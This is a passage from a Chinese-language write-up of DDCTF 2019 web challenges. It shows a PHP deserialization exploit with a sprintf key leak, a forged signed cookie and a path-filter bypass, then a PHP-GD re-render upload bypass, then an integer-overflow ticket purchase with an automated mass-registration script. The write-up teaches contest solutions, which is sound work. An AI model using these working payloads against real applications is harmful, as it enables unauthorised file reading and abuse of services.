            return FALSE;
        }
        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this-&gt;eancrykey.$session)) {
            parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;);
            return FALSE;
        }
        $session = unserialize($session);


        if(!is_array($session) OR !isset($session[&apos;session_id&apos;]) OR !isset($session[&apos;ip_address&apos;]) OR !isset($session[&apos;user_agent&apos;])){
            return FALSE;
        }

        if(!empty($_POST[&quot;nickname&quot;])) {
            $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);
            $data = &quot;Welcome my friend %s&quot;;
            foreach ($arr as $k =&gt; $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,&quot;Welcome&quot;);
        }

        if($session[&apos;ip_address&apos;] != $_SERVER[&apos;REMOTE_ADDR&apos;]) {
            parent::response(&apos;the ip addree not match&apos;.&apos;error&apos;);
            return FALSE;
        }
        if($session[&apos;user_agent&apos;] != $_SERVER[&apos;HTTP_USER_AGENT&apos;]) {
            parent::response(&apos;the user agent not match&apos;,&apos;error&apos;);
            return FALSE;
        }
        return TRUE;

    }

    private function session_create() {
        $sessionid = &apos;&apos;;
        while(strlen($sessionid) &lt; 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

        $userdata = array(
            &apos;session_id&apos; =&gt; md5(uniqid($sessionid,TRUE)),
            &apos;ip_address&apos; =&gt; $_SERVER[&apos;REMOTE_ADDR&apos;],
            &apos;user_agent&apos; =&gt; $_SERVER[&apos;HTTP_USER_AGENT&apos;],
            &apos;user_data&apos; =&gt; &apos;&apos;,
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);
        $expire = $this-&gt;cookie_expiration + time();
        setcookie(
            $this-&gt;cookie_name,
            $cookiedata,
            $expire,
            $this-&gt;cookie_path,
            $this-&gt;cookie_domain,
            $this-&gt;cookie_secure
            );

    }
}


$ddctf = new Session();
$ddctf-&gt;index();
</code></pre><p>&#x8FD9;&#x91CC;&#x6211;&#x624D;&#x6709;&#x56DE;&#x6EAF;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5148;&#x786E;&#x5B9A;flag&#x53EF;&#x80FD;&#x7684;&#x8F93;&#x51FA;&#x70B9;&#x5728;&#x6784;&#x9020;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x7684;payload&#x3002;<br>&#x5728;<code>private function get_key()</code>&#x51FD;&#x6570;&#x91CC;&#x63D0;&#x793A;&#x5230;flag&#x4E0E;eanccrykey&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x731C;&#x6D4B;flag&#x5185;&#x5BB9;&#x5728;<code>../config/flag.txt</code>&#x91CC;&#x3002;<br>&#x901A;&#x8BFB;&#x4EE3;&#x7801;&#xFF0C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x552F;&#x4E00;&#x53EF;&#x80FD;&#x7684;flag&#x8F93;&#x51FA;&#x70B9;&#x5728;<code>public function __destruct()</code>&#xFF0C;&#x8FD9;&#x662F;Application&#x7C7B;&#x7684;&#x6790;&#x6784;&#x51FD;&#x6570;&#xFF0C;&#x9000;&#x51FA;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x6267;&#x884C;&#x91CC;&#x8FB9;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x7ED3;&#x5408;&#x4E0B;&#x8FB9;&#x7684;serialize&#x4E0E;unserialize&#x6613;&#x77E5;&#x6B64;&#x9898;&#x8003;&#x7684;&#x662F;php&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;<br>&#x800C;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x5BF9;cookie&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#x662F;&#x4E0D;&#x884C;&#xFF0C;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x670D;&#x52A1;&#x7AEF;&#x4F7F;&#x7528;key&#x8FDB;&#x884C;&#x4E86;&#x52A0;&#x5BC6;&#x9A8C;&#x8BC1;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x80FD;&#x62FF;&#x5230;key&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x90A3;&#x4E48;&#x53D8;&#x53EF;&#x4EE5;&#x8F7B;&#x6613;&#x7ED5;&#x8FC7;&#x3002;  </p>
<pre class="language-"><code>        if(!empty($_POST[&quot;nickname&quot;])) {
            $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);
            $data = &quot;Welcome my friend %s&quot;;
            foreach ($arr as $k =&gt; $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,&quot;Welcome&quot;);
        }
</code></pre><p>&#x6211;&#x4EEC;&#x6CE8;&#x610F;&#x5230;&#x6B64;&#x5904;&#x51FD;&#x6570;&#x6D89;&#x53CA;&#x5230;key&#x503C;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5176;&#x4E2D;sprintf&#x4E3A;&#x5360;&#x4F4D;&#x7B26;&#x66FF;&#x6362;&#x51FD;&#x6570;&#x3002;<br>&#x5982;&#x679C;&#x6211;&#x4EEC;post&#x7684;nickname&#x503C;&#x91CC;&#x5B58;&#x5728;%s &#x90A3;&#x4E48;key&#x503C;&#x4E5F;&#x4F1A;&#x968F;&#x7740;&#x8F93;&#x51FA;&#x3002;<br>&#x5148;&#x83B7;&#x5F97;cookie&#x503C;&#xFF0C;&#x8BB0;&#x5F97;header&#x5934;&#x52A0;&#x4E0A;<code>didictf_username: admin</code><br><img src="https://i.loli.net/2019/04/18/5cb774ca8eb5c.png" alt=""><br>&#x5C06;cookie&#x66FF;&#x6362;&#xFF0C;post&#x5185;&#x5BB9;:<code>nickname=a---%s</code><br>&#x5F97;&#x5230;key:<code>EzblrbNS</code>&#xFF0C;&#x81F3;&#x6B64;&#x5927;&#x5DE5;&#x544A;&#x6210;&#x3002;<br><img src="https://i.loli.net/2019/04/18/5cb774ca92d3c.png" alt=""><br>&#x7406;&#x6E05;&#x4E0B;&#x601D;&#x8DEF;&#xFF1A;  </p>
<ul>
<li>1.&#x65B0;&#x5EFA;Application&#x7C7B;&#xFF0C;&#x4FEE;&#x6539;path&#x53D8;&#x91CF;&#x4E3A;<code>..././config/flag.txt</code>(../&#x8FDB;&#x884C;&#x8FC7;&#x4E00;&#x6B21;&#x8FC7;&#x6EE4;)  </li>
<li>2.&#x5C06;&#x7C7B;&#x52A0;&#x5165;$userdata&#x6570;&#x7EC4;&#x8FDB;&#x884C;&#x5E8F;&#x5217;&#x5316;&#x5904;&#x7406;</li>
<li>3.&#x8FD4;&#x56DE;key&#x52A0;&#x5BC6;&#x540E;&#x7684;cookie</li>
<li>4.getflag</li>
</ul>
<p>&#x672C;&#x5730;&#x642D;&#x5EFA;php&#x73AF;&#x5883;&#xFF1A;
&#x5C06;&#x4EE5;&#x4E0B;&#x6E90;&#x7801;&#x590D;&#x5236;&#x8BBF;&#x95EE; &#x5373;&#x53EF;&#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x636E;&#xFF1A;</p>
<pre class="language-"><code><span class="token prolog">&lt;?
Class Application {
    var $path = &apos;&apos;;


    public function response($data, $errMsg = &apos;success&apos;) {
        $ret = [&apos;errMsg&apos; =&gt; $errMsg,
            &apos;data&apos; =&gt; $data];
        $ret = json_encode($ret);
        header(&apos;Content-type: application/json&apos;);
        echo $ret;

    }

    public function auth() {
        return true;

    }
    private function sanitizepath($path) {
    $path = trim($path);
    $path=str_replace(&apos;../&apos;,&apos;&apos;,$path); 
    $path=str_replace(&apos;..\\&apos;,&apos;&apos;,$path);
    return $path;
}

public function __destruct() {
    $this-&gt;response($this-&gt;user_agent);
    if(empty($this-&gt;path)) {
        $this-&gt;response(&quot;error111&quot;);
        exit();
    }else{
        $path = $this-&gt;sanitizepath($this-&gt;path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;);
    }
    exit();
}
}

class Session extends Application {

    //key&#x5EFA;&#x8BAE;&#x4E3A;8&#x4F4D;&#x5B57;&#x7B26;&#x4E32;
    var $eancrykey                  = &apos;&apos;;
    var $cookie_expiration            = 7200;
    var $cookie_name                = &apos;ddctf_id&apos;;
    var $cookie_path                = &apos;&apos;;
    var $cookie_domain                = &apos;&apos;;
    var $cookie_secure                = FALSE;
    var $activity                   = &quot;DiDiCTF&quot;;


    public function index()
    {
    if(parent::auth()) {
            $this-&gt;get_key();
            if($this-&gt;session_read()) {
                $data = &apos;DiDI Welcome you %s&apos;;
                $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]);
                parent::response($data,&apos;sucess&apos;);
            }else{
                $this-&gt;session_create();
                $data = &apos;DiDI Welcome you&apos;;
                parent::response($data,&apos;sucess&apos;);
            }
        }

    }

    private function get_key() {
        //eancrykey  and flag under the folder
        $this-&gt;eancrykey =  &apos;EzblrbNS&apos;;
    }

    public function session_read() {
        if(empty($_COOKIE)) {
        return FALSE;
        }

        $session = $_COOKIE[$this-&gt;cookie_name];
        if(!isset($session)) {
            parent::response(&quot;session not found&quot;,&apos;error&apos;);
            return FALSE;
        }
        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this-&gt;eancrykey.$session)) {
            parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;);
            return FALSE;
        }
        $session = unserialize($session);


        if(!is_array($session) OR !isset($session[&apos;session_id&apos;]) OR !isset($session[&apos;ip_address&apos;]) OR !isset($session[&apos;user_agent&apos;])){
            return FALSE;
        }

        if(!empty($_POST[&quot;nickname&quot;])) {
            $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);
            $data = &quot;Welcome my friend %s&quot;;
            foreach ($arr as $k =&gt; $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,&quot;Welcome&quot;);
        }

        if($session[&apos;ip_address&apos;] != $_SERVER[&apos;REMOTE_ADDR&apos;]) {
            return true;
        }
        if($session[&apos;user_agent&apos;] != $_SERVER[&apos;HTTP_USER_AGENT&apos;]) {
            parent::response(&apos;the user agent not match&apos;,&apos;error&apos;);
            return FALSE;
        }
        return TRUE;

    }

    private function session_create() {
        $sessionid = &apos;&apos;;
        while(strlen($sessionid) &lt; 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

        $a = new Application;  //&#x65B0;&#x5EFA;Application&#x7C7B;
        $a-&gt;path = &apos;..././config/flag.txt&apos;;  //&#x4FEE;&#x6539;&#x7C7B;&#x4E2D;&#x53D8;&#x91CF;path

        $userdata = array(
            $a,  //&#x5E8F;&#x5217;&#x5316;
            &apos;session_id&apos; =&gt; md5(uniqid($sessionid,TRUE)),
            &apos;ip_address&apos; =&gt; $_SERVER[&apos;REMOTE_ADDR&apos;],
            &apos;user_agent&apos; =&gt; $_SERVER[&apos;HTTP_USER_AGENT&apos;],
            &apos;user_data&apos; =&gt; &apos;&apos;,
        );

        $cookiedata = serialize($userdata);
        parent::response($cookiedata);
        $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);
        $expire = $this-&gt;cookie_expiration + time();
        setcookie(
            $this-&gt;cookie_name,
            $cookiedata,
            $expire,
            $this-&gt;cookie_path,
            $this-&gt;cookie_domain,
            $this-&gt;cookie_secure
            );

    }
}

$ddctf = new Session();
$ddctf-&gt;index();?&gt;</span>
</code></pre><p>&#x751F;&#x6210;&#x6570;&#x636E;&#xFF1A;</p>
<pre class="language-"><code>a:5:{i:0;O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;}s:10:&quot;session_id&quot;;s:32:&quot;d31fd78332ef2737d3c007915d643d86&quot;;s:10:&quot;ip_address&quot;;s:13:&quot;192.168.246.1&quot;;s:10:&quot;user_agent&quot;;s:115:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;}
</code></pre><p>&#x6CE8;&#x610F;&#x6B64;&#x5904;&#x7684;&#x6570;&#x636E;&#x7531;&#x4E8E;UA&#x5934;&#x4E0D;&#x540C;&#xFF0C;&#x8BF7;&#x81EA;&#x5DF1;&#x751F;&#x6210;&#x3002;<br>&#x8BB0;&#x5F97;&#x52A0;&#x4E0A;key&#x8FDB;&#x884C;md5&#x52A0;&#x5BC6;&#xFF1A;  </p>
<pre class="language-"><code class="lang-python"><span class="token keyword">import</span> hashlib
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">&apos;EzblrbNS&apos;</span><span class="token operator">+</span><span class="token string">&apos;a:5:{i:0;O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;}s:10:&quot;session_id&quot;;s:32:&quot;d31fd78332ef2737d3c007915d643d86&quot;;s:10:&quot;ip_address&quot;;s:13:&quot;192.168.246.1&quot;;s:10:&quot;user_agent&quot;;s:115:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;}&apos;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&apos;utf8&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>&#x5F97;&#x5230;hash:<code>3c27da16d59c7edbacbf41a5cea391c3</code><br>&#x4FEE;&#x6539;&#x6570;&#x636E;&#x5305;&#x91CD;&#x653E;&#xFF1A;<br><img src="https://i.loli.net/2019/04/18/5cb774ca91cf1.png" alt=""><br>&#x8BB0;&#x5F97;&#x5148;url&#x7F16;&#x7801;&#x54DF;~<br>flag: <code>DCTF{ddctf2019_*****_pHVlHIDDGdV8qA2j}</code></p>
<h3 id="uploadimg"><a name="uploadimg" class="anchor-navigation-ex-anchor" href="#uploadimg"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.3. UploadIMG</h3>
<p>&#x4F5C;&#x8005;&#xFF1A;<strong>Glzjin</strong>  </p>
<blockquote>
<p>&#x77E5;&#x8BC6;&#x70B9;&#xFF1A;PHP-GD &#x4E8C;&#x6B21;&#x6E32;&#x67D3;&#x7ED5;&#x8FC7;</p>
</blockquote>
<p>&#x6B65;&#x9AA4;&#xFF1A;
1&#x3001;&#x7528;&#x4E0A;&#x9762;&#x7ED9;&#x51FA;&#x7684;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#x6253;&#x5F00;&#x9776;&#x673A;&#xFF0C;&#x53D1;&#x73B0;&#x662F;&#x8FD9;&#x4E48;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#x3002;<br><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/15553723500cc490e43a116c274bc5557f733d0869-1024x323.png" alt=""><br>2&#x3001;&#x90A3;&#x4E48;&#x5C31;&#x4F20;&#x4E00;&#x4E2A;&#x56FE;&#x7247;&#x4E0A;&#x53BB;&#x8BD5;&#x8BD5;&#x5427;&#x3002;<br><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/155537260287d2e92e09b23c9abb99ce89ba1ac2e8.png" alt=""><br>3&#x3001;&#x4E0A;&#x4F20;&#x4E4B;&#x540E;&#xFF0C;&#x53D1;&#x73B0;&#x63D0;&#x793A; &#x201C;[Check Error]&#x4E0A;&#x4F20;&#x7684;&#x56FE;&#x7247;&#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#x672A;&#x5305;&#x542B;&#x6307;&#x5B9A;&#x5B57;&#x7B26;&#x4E32;:phpinfo()&#x201D;&#xFF0C;&#x5E76;&#x4E14;&#x8FD8;&#x8FD4;&#x56DE;&#x4E86;&#x4E0A;&#x4F20;&#x4E4B;&#x540E;&#x56FE;&#x7247;&#x7684;&#x5730;&#x5740;&#x3002;<br><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555372708745cdb732452923fbf7c4c327973f0e8-1024x413.png" alt=""><br><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/155537272304aa21341ba770893c94b55cb16072c9-1024x105.png" alt=""><br>4&#x3001;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x628A;&#x6211;&#x4EEC;&#x4E0A;&#x4F20;&#x4E4B;&#x540E;&#x7684;&#x56FE;&#x7247;&#x4E0B;&#x8F7D;&#x56DE;&#x6765;&#x770B;&#x770B;&#x5427;&#x3002;&#x4E0B;&#x8F7D;&#x4E4B;&#x540E;&#x7528; hex &#x7F16;&#x8F91;&#x5668;&#x6253;&#x5F00;&#x3002;&#x53D1;&#x73B0;&#x5F00;&#x5934;&#x8FD9;&#x513F;&#x6307;&#x660E;&#x4E86;&#x5176;&#x662F; php-gd &#x5E26;&#x7740; libjpeg &#x8F6C;&#x6362;&#x7684;&#x3002;<br><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/15553729738ada50c267bdc84bc2acc4aa7026b147.png" alt=""><br>5&#x3001;&#x6BD4;&#x8F83;&#x4E00;&#x4E0B;&#x539F;&#x56FE;&#x7247;&#x548C;&#x73B0;&#x5728;&#x7684;&#x56FE;&#x7247;&#xFF0C;&#x4F3C;&#x4E4E;&#x6709;&#x5F88;&#x591A;&#x4E0D;&#x540C;&#x3002;<br><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555373208b5c3313e5967c99508c1f8b44d06ebc0-1024x891.png" alt=""><br>6&#x3001;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x628A;&#x4E0B;&#x8F7D;&#x4E0B;&#x6765;&#x7684;&#x56FE;&#x7247;&#x518D;&#x4F20;&#x56DE;&#x53BB;&#x5462;&#xFF1F;<br><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/155537332599e8f433b70e3f521e5a91d6a3c3a897.png" alt=""><br>7&#x3001;&#x554A;&#x54C8;&#xFF0C;&#x8FD9;&#x4E00;&#x628A;&#x524D;&#x9762;&#x5012;&#x662F;&#x86EE;&#x591A;&#x76F8;&#x540C;&#x7684;&#x5730;&#x65B9;&#x4E86;&#x3002;<br><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555373422ba1bed458a8c194a4c09254dc4a248d2-1010x1024.png" alt=""><br>8&#x3001;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x5F80;&#x91CC;&#x9762;&#x76F8;&#x540C;&#x7684;&#x90E8;&#x5206;&#x66FF;&#x6362; &#x201C;phpinfo()&#x201D; (9&#x5B57;&#x8282;)&#x8BD5;&#x8BD5;&#x3002;<br><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/15553736390904ad879af481c53e3099d0b81db514.png" alt=""><br><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/155537367339d3a21fa09eaddb5277ea7c0edc8125-1024x422.png" alt=""><br>9&#x3001;&#x4E0D;&#x65AD; fuzz &#x63D2;&#x5165;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x53D1;&#x73B0;&#x63D2;&#x5165;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x3002;<br><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555373819fe1bbd046af53863385ecf0163df88cd.png" alt=""><br><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555373851148738e582fecd7b4595f072da4b1c71-1024x374.png" alt=""><br>10&#x3001;Flag &#x5230;&#x624B;~</p>
<h3 id="&#x5927;&#x5409;&#x5927;&#x5229;&#xFF0C;&#x4ECA;&#x665A;&#x5403;&#x9E21;"><a name="&#x5927;&#x5409;&#x5927;&#x5229;&#xFF0C;&#x4ECA;&#x665A;&#x5403;&#x9E21;" class="anchor-navigation-ex-anchor" href="#&#x5927;&#x5409;&#x5927;&#x5229;&#xFF0C;&#x4ECA;&#x665A;&#x5403;&#x9E21;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.4. &#x5927;&#x5409;&#x5927;&#x5229;&#xFF0C;&#x4ECA;&#x665A;&#x5403;&#x9E21;~</h3>
<p>&#x672C;&#x6587;&#x4F5C;&#x8005;&#xFF1A;<strong>12end</strong><br>&#x8FDB;&#x53BB;&#x6CE8;&#x518C;&#xFF0C;&#x767B;&#x5F55;&#x540E;&#x53EA;&#x6709;100&#x91D1;&#x5E01;&#xFF0C;&#x4F46;&#x662F;&#x5403;&#x9E21;&#x7684;ticket&#x9700;&#x8981;2000&#x91D1;&#x5E01;&#xFF0C;&#x9700;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x7ED5;&#x8FC7;&#x53BB;&#x3002;  </p>
<h4 id="&#x8D2D;&#x4E70;ticket"><a name="&#x8D2D;&#x4E70;ticket" class="anchor-navigation-ex-anchor" href="#&#x8D2D;&#x4E70;ticket"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8D2D;&#x4E70;ticket" class="plugin-anchor" href="#&#x8D2D;&#x4E70;ticket"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8D2D;&#x4E70;ticket</h4>
<p>&#x622A;&#x53D6;&#x6DFB;&#x52A0;&#x8BA2;&#x5355;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x53D1;&#x73B0;&#x662F;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;get&#x8BF7;&#x6C42;&#xFF0C;&#x4E14;ticket_price&#x662F;&#x53EF;&#x63A7;&#x7684;&#xFF1A;<br><img src="http://imgs.12end.xyz/ctf/ddctf2019/5.png" alt=""><br>&#x7ECF;&#x5C1D;&#x8BD5;&#x53D1;&#x73B0;&#xFF0C;&#x8FD9;&#x4E2A;tickiet_price&#x53EA;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x5730;&#x6BD4;2000&#x5927;&#xFF0C;&#x4E14;&#x53EA;&#x80FD;&#x542B;&#x6709;&#x6570;&#x5B57;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x53EA;&#x80FD;&#x8003;&#x8651;&#x6574;&#x6570;&#x6EA2;&#x51FA;&#x4E86;&#x3002;<br>&#x5728;32&#x4F4D;&#x7CFB;&#x7EDF;&#x4E0B;&#xFF0C;&#x6240;&#x6709;&#x65E0;&#x7B26;&#x53F7;&#x6574;&#x6570;&#x7684;&#x6570;&#x91CF;&#x662F;2^32=4294967296&#xFF0C;&#x53BB;&#x6389;0&#x8FD9;&#x4E2A;&#x6570;&#x7684;&#x8BDD;&#xFF0C;&#x6700;&#x5927;&#x6574;&#x6570;&#x4FBF;&#x662F;4294967295&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x4EE4;&#x4E00;&#x4E2A;&#x6570;&#x7B49;&#x4E8E;2^32&#x65F6;&#xFF0C;&#x5B83;&#x4FBF;&#x4F1A;&#x6EA2;&#x51FA;&#x4E3A;0&#x3002;<br>&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x4F20;&#x5165;4294967297,&#x867D;&#x7136;&#x8BA2;&#x5355;&#x9875;&#x9762;&#x663E;&#x793A;&#x7684;&#x8FD8;&#x662F;&#x5982;&#x6B64;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x652F;&#x4ED8;&#x8BA2;&#x5355;&#x65F6;&#xFF0C;&#x5B83;&#x624D;&#x4EA7;&#x751F;&#x4E86;&#x6EA2;&#x51FA;&#xFF0C;&#x521D;&#x6B65;&#x8BA4;&#x4E3A;&#x4ED6;&#x662F;&#x4EE5;&#x5B57;&#x7B26;&#x4E32;&#x5B58;&#x5165;&#xFF0C;&#x5728;&#x8FD0;&#x7B97;&#x65F6;&#x518D;&#x8F6C;&#x6362;&#x4E3A;&#x6574;&#x578B;&#xFF08;&#x53EF;&#x80FD;&#x5E76;&#x4E0D;&#x51C6;&#x786E;&#xFF09;&#xFF0C;&#x6700;&#x540E;&#x53EA;&#x82B1;&#x4E86;1&#x91D1;&#x5E01;&#x8D2D;&#x4E70;&#xFF1A;<br><img src="http://imgs.12end.xyz/ctf/ddctf2019/6.png" alt=""><br>&#x8FDB;&#x5230;&#x6E38;&#x620F;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x63D0;&#x4EA4;&#x6B63;&#x786E;id&#x4E0E;ticket&#x6765;&#x79FB;&#x9664;&#x5BF9;&#x624B;&#xFF0C;&#x6CA1;&#x4EC0;&#x4E48;&#x597D;&#x529E;&#x6CD5;&#xFF0C;&#x7ECF;&#x8FC7;&#x4E00;&#x756A;&#x5C1D;&#x8BD5;&#x4E86;&#x89E3;&#x5230;id&#x4E0E;ticket&#x662F;&#x56FA;&#x5B9A;&#x5BF9;&#x5E94;&#x7684;&#x5173;&#x7CFB;&#xFF0C;&#x53EA;&#x6709;&#x5199;&#x811A;&#x672C;&#x901A;&#x8FC7;&#x66B4;&#x529B;&#x6CE8;&#x518C;&#x83B7;&#x53D6;&#x5C3D;&#x53EF;&#x80FD;&#x591A;&#x7684;id&#xFF0C;&#x7136;&#x540E;&#x4E00;&#x4E00;&#x5220;&#x9664;&#x4E86;&#x3002;  </p>
<p>tips:<br>&#x5269;&#x4F59;&#x5BF9;&#x624B;&#x7684;100&#x4EBA;&#x4E2D;&#xFF0C;id&#x662F;&#x4EFB;&#x610F;&#x7684;&#xFF0C;&#x4F60;&#x5E76;&#x4E0D;&#x80FD;&#x4FDD;&#x8BC1;&#x53EA;&#x9700;&#x8981;&#x6CE8;&#x518C;100&#x6B21;&#x5C31;&#x53EF;&#x4EE5;&#x5220;&#x6389;&#x5168;&#x90E8;&#x7684;&#x5BF9;&#x624B;&#xFF0C;&#x6700;&#x6709;&#x6548;&#x7684;&#x529E;&#x6CD5;&#x662F;&#x6CE8;&#x518C;&#x4E00;&#x6B21;&#x5220;&#x9664;&#x4E00;&#x6B21;&#x3002;  </p>
<p>&#x56E0;&#x7BC7;&#x5E45;&#x539F;&#x56E0;&#xFF0C;&#x6293;&#x53D6;api&#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x7F16;&#x5199;&#x811A;&#x672C;&#x7684;&#x8FC7;&#x7A0B;&#x4FBF;&#x4E0D;&#x518D;&#x8D58;&#x8FF0;&#xFF0C;&#x811A;&#x672C;&#x6CE8;&#x91CA;&#x5DF2;&#x8F83;&#x4E3A;&#x8BE6;&#x5C3D;&#xFF0C;&#x4F7F;&#x7528;&#x65F6;&#x4FEE;&#x6539;&#x53C2;&#x6570;&#x5373;&#x53EF;&#xFF0C;&#x552F;&#x4E00;&#x7F3A;&#x61BE;&#x662F;&#x4EE3;&#x7801;&#x5065;&#x58EE;&#x6027;&#x6B20;&#x4F73;&#xFF0C;&#x9047;&#x5230;&#x7F51;&#x7EDC;&#x95EE;&#x9898;&#x65F6;&#x4E0D;&#x80FD;&#x5904;&#x7406;&#x9519;&#x8BEF;&#x9020;&#x6210;&#x5D29;&#x6E83;&#xFF0C;&#x4F46;&#x4EE3;&#x7801;&#x4F5C;&#x7528;&#x662F;&#x53EF;&#x7EED;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x95EE;&#x9898;&#x4E0D;&#x5927;&#xFF0C;&#x91CD;&#x542F;&#x811A;&#x672C;&#x5C31;&#x53EF;&#x4EE5;&#x7EE7;&#x7EED;&#x4E86;  </p>
<pre class="language-"><code>import requests
import time

regist = &quot;http://117.51.147.155:5050/ctf/api/register?password=11111111&amp;name=&quot;#name&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x524D;&#x7F00;
buy_ticket = &quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&quot;
pay_ticket = &quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&quot;
delete = &quot;http://117.51.147.155:5050/ctf/api/remove_robot&quot;
get_flag=&quot;http://117.51.147.155:5050/ctf/api/get_flag&quot;

i= 55555                                                       #&#x521D;&#x59CB;&#x5316;&#x7528;&#x6237;&#x540D;,&#x4F7F;&#x7528;&#x672A;&#x6CE8;&#x518C;&#x8FC7;&#x7684;&#x6570;&#x5B57;

def delete_robot(player_id, player_ticket):
    COOKIE = {&quot;Cookie&quot;: &quot;user_name=; REVEL_SESSION=&quot;}               #&#x4FEE;&#x6539;&#x4E3A;&#x81EA;&#x5DF1;&#x4E3B;&#x8D26;&#x6237;&#x7684;cookie
    param={&quot;id&quot;:player_id,&quot;ticket&quot;:player_ticket}
    requests.get(delete,params=param, headers=COOKIE)               #&#x5220;&#x9664;id
    flag = requests.get(get_flag, headers=COOKIE)                   #&#x83B7;&#x53D6;&#x5269;&#x4F59;&#x7684;&#x654C;&#x4EBA;&#x6570;&#x91CF;
    print(flag.text )

while True:
    t = requests.session()
    i+=1
    r = t.get(regist + str(i))                      #&#x6CE8;&#x518C;
    r = t.get(buy_ticket).json()                    #&#x8D2D;&#x4E70;Ticket&#xFF0C;&#x89E3;&#x6790;json
    bill_id = r[&quot;data&quot;][0][&quot;bill_id&quot;]               #json&#x89E3;&#x6790;bill_id
    r = t.get(pay_ticket + bill_id).json()          #&#x652F;&#x4ED8;&#x8BA2;&#x5355;
    player_id = r[&quot;data&quot;][0][&quot;your_id&quot;]
    player_ticket = r[&quot;data&quot;][0][&quot;your_ticket&quot;]     #json&#x89E3;&#x6790;id&#x4E0E;ticket
